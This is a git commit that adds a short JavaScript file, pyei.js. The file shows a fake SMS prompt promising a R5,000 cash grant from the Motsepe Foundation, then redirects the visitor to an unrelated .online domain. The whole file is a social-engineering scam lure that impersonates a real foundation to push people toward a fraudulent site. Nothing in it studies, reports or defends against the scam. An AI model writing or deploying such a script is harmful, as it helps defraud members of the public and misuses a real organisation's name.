1332196a87d5c28d3f57010bdeb556cb85789738
newetijazz7 <newetijazz7@gmail.com>
2026-01-10 09:23:24 +0100

    Create pyei.js

---
+++ pyei.js
@@ -0,0 +1,5 @@
+var password = 'Withdraw R5,000'
+password=prompt('SMS: Congratulations you are invited to Receive R5,000 Cash Grant from Motsepe Foundation, press OK to Get offer now','Withdraw R5,000');
+if (password != 'Withdraw R5,000') {
+location.href='https://www.jvrrdif.online/Motsepe-R5000-PYEI-2026-Grant';
+}
